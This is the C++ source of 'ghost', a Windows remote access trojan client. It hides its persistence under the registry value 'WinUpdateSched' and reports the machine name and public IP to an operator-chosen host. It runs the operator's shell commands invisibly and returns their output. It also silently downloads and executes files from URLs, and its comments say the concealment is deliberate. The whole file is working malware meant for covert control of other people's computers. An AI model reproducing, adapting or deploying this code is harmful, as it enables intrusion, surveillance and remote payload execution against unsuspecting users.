/*
	@title
		ghost
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	ghost is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	ghost is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#define						AHXRLOGGER_PLUGIN // https://github.com/AHXR/ahxrlogger
#define						DEFAULT_BUFF					9056
#define						TMPLOG							"svchost.log"
#define						KEY_TARGET						HKEY_LOCAL_MACHINE
#define						KEY_NON_ADMIN_TARGET			HKEY_CURRENT_USER
#define						KEY_STARTUP						"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define						KEY_NON_ADMIN_STARTUP			"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define						KEY_VALUE_NAME					"WinUpdateSched"

#include					"ahxrwinsock.h"
#include					"resource.h"
#include					"json.hpp"

#include					<ShlObj.h>
#include					<Shellapi.h>
#include					<fstream>
#include					<string>
#include					<wininet.h>

using namespace				std;
using namespace				System::Runtime::InteropServices;
using						json = nlohmann::json;

PCSTR						str_host;
PCSTR						str_port;
TCHAR						str_temp[MAX_PATH];
TCHAR						str_windows[MAX_PATH];
char						c_temp_cmd[ MAX_PATH + 20 ];
char						c_cmd_dir[MAX_PATH + 7];
bool						b_cmd;
AHXRCLIENT					client;

void						onClientConnect();
void						onClientRecData( char * data);
DWORD WINAPI				t_ping(LPVOID lpParams);
string						real_ip();

#pragma comment				(lib, "shell32.lib")
#pragma comment				(lib, "Advapi32.lib")
#pragma comment				(lib, "Wininet.lib")

void main(cli::array<System::String^>^ args)
{
	if (args->Length < 2) // IP and Port;
		exit(EXIT_FAILURE);

	// String to PCSTR (const char *)
	str_host = (const char * ) Marshal::StringToHGlobalAnsi(args[0]).ToPointer();
	str_port = (const char * ) Marshal::StringToHGlobalAnsi(args[1]).ToPointer();

	GetTempPath(MAX_PATH, str_temp); // Temp path for returning cmd response.
	GetSystemDirectory(str_windows, MAX_PATH);  // Looking for cmd.exe

	sprintf(c_temp_cmd, "%s%s", str_temp, TMPLOG);
	sprintf(c_cmd_dir, "%s\\cmd.exe", str_windows);

	remove(c_temp_cmd); // Remove previous instance.

	// Adding to start-up.
	HKEY h_key;
	long l_key;

	l_key = RegOpenKeyEx(KEY_TARGET, KEY_STARTUP, 0, KEY_ALL_ACCESS, &h_key);

	// No admin access. Just make it user startup.
	if (l_key == ERROR_ACCESS_DENIED)
		l_key = RegOpenKeyEx(KEY_NON_ADMIN_TARGET, KEY_NON_ADMIN_STARTUP, 0, KEY_ALL_ACCESS, &h_key);

	if (l_key == ERROR_SUCCESS) {

		HMODULE h_mod = GetModuleHandleW(NULL);
		char * c_path[MAX_PATH];
		GetModuleFileNameA(h_mod, (char *)c_path, MAX_PATH);

		char * full_path = new char[MAX_PATH + 50];
		sprintf(full_path, "\"%s\" %s %s", c_path, str_host, str_port);

		RegSetValueEx(h_key, KEY_VALUE_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);
		RegCloseKey(h_key);
	}

	// Starting and idling server
	while (1) {
		if( client.init(str_host, str_port, TCP_SERVER, onClientConnect) ) 
			client.listen(onClientRecData, false);

		if (client.Socket_Client != INVALID_SOCKET)
			closesocket(client.Socket_Client);

		b_cmd = false; // Safe reset
		Sleep(1000);
	}
}

DWORD WINAPI t_ping(LPVOID lpParams) {
	while (1) {
		Sleep(3000);
		char buf;
		int err = recv(client.Socket_Client, &buf, 1, MSG_PEEK);
		if (err == SOCKET_ERROR)
		{
			if (WSAGetLastError() != WSAEWOULDBLOCK)
			{
				client.close();
				break;
			}
		}
	}
	return 0;
}

void onClientConnect() {
	json			sys_data;
	TCHAR			c_comp_name[ MAX_COMPUTERNAME_LENGTH + 1 ];
	DWORD			c_comp_size;

	c_comp_size		= sizeof(c_comp_name);
	GetComputerName(c_comp_name, &c_comp_size);

	Sleep(1000);
	sys_data["ID"] = c_comp_name;
	sys_data["IP"] = real_ip();
	sys_data["PORT"] = str_port;

	client.send_data(sys_data.dump().c_str());

	CreateThread(0, 0, t_ping, 0, 0, 0);
}

void onClientRecData( char * data ) {
	int i_len			= strlen(data) + MAX_PATH + 1;
	char * c_output		= new char[i_len];
	c_output[i_len - 1] = '\0';

	/*
		The keyword "ghost_ping" is strictly for the server to determine whether the socket is 
		active or not. Any data that is simply "ghost_ping" will be ignored.
	*/
	if (strcmp(data, "ghost_ping") != 0) {
		if (!strcmp(data, "CMD"))  // Toggling Command Prompt response
			b_cmd = !b_cmd;
		else {
			if (b_cmd) {

				int				i_length;
				fstream			f_response;

				sprintf(c_output, "/C %s > %s", data, c_temp_cmd);

				/*
					Running the command without a window. Using WinExec, system, or ShellExecute will make
					a random command prompt pop-up. This will make it obvious that something is going on 
					in the background, which voids the whole point of "ghost".
				*/
				STARTUPINFO info = { sizeof(info) };
				PROCESS_INFORMATION processInfo;
				if (CreateProcess(c_cmd_dir, c_output, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo)) {
					WaitForSingleObject(processInfo.hProcess, INFINITE);
					CloseHandle(processInfo.hProcess);
					CloseHandle(processInfo.hThread);
				}

				/*
					In c_output, the right carrot symbol writes the output to a file. Here, we are going to 
					read that file and send the result back to the server. This is so the server knows what 
					happened with their command.

					Certain commands will return no response, which is fine. However, as far as I'm concerned,
					invalid commands do not write to a file.
				*/
				f_response.open(c_temp_cmd, ios::in | ios::binary);

				f_response.seekg(0, f_response.end);
				i_length = (int)f_response.tellg();
				f_response.seekg(0, f_response.beg);

				if (i_length > 0) {
					char * c_read = new char[i_length];
					f_response.read(c_read, i_length);

					// Null terminating. Without this, there will be gibberish at the end of the data.
					c_read[i_length] = '\0';
					if (c_read[i_length - 1] == '\n')
						c_read[i_length - 1] = '\0';

					client.send_data(c_read);
				}
				else
					client.send_data("Invalid command or empty response.");

			}

			// "Download & Execute"
			if (!b_cmd && strcmp(data, "CMD") != 0) {
				HRSRC			hr_res;
				DWORD32			dw_res;
				LPVOID			lp_res;
				LPVOID			lp_res_lock;

				// Creating the wget file.
				hr_res = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
				dw_res = ::SizeofResource(NULL, hr_res);
				lp_res = LoadResource(NULL, hr_res);
				lp_res_lock = LockResource(lp_res);

				fstream f_wget("wget.exe", ios::out | ios::binary);
				f_wget.write((char *)lp_res, dw_res);
				f_wget.close();

				// Fetching the sent data.
				json j_response = json::parse(data);
				sprintf(c_output, "/C wget %s -O %s", j_response["URL"].get<string>().c_str(), j_response["FILE"].get<string>().c_str());
	
				// Running wget.exe in the background. Hiding the command prompt as well. Silent downloading.
				STARTUPINFO info = { sizeof(info) };
				PROCESS_INFORMATION processInfo;
				if (CreateProcess("wget.exe", c_output, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo))
				{
					WaitForSingleObject(processInfo.hProcess, INFINITE);
					CloseHandle(processInfo.hProcess);
					CloseHandle(processInfo.hThread);
				}

				char c_dir[MAX_PATH];
				string s_dir;
				GetModuleFileName(NULL, c_dir, MAX_PATH);

				string::size_type pos = string(c_dir).find_last_of("\\/");
				s_dir = string(c_dir).substr(0, pos);

				sprintf(c_output, "%s has downloaded and saved at: %s\\%s\nNow executing...",
					j_response["URL"].get<string>().c_str(),
					s_dir.c_str(),
					j_response["FILE"].get<string>().c_str()
					);

				client.send_data(c_output);

				// Running the downloaded file and removing wget.exe
				ShellExecute(NULL, "open", j_response["FILE"].get<string>().c_str(), 0, 0, 0);
				remove("wget.exe");
			}
		}
	}
}

std::string real_ip() {

	HINTERNET net = InternetOpen("--",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET conn = InternetOpenUrl(net,
		"https://api.ipify.org/",
		NULL,
		0,
		INTERNET_FLAG_RELOAD,
		0);

	char buffer[4096];
	DWORD read;

	InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
	InternetCloseHandle(net);

	return std::string(buffer, read);
}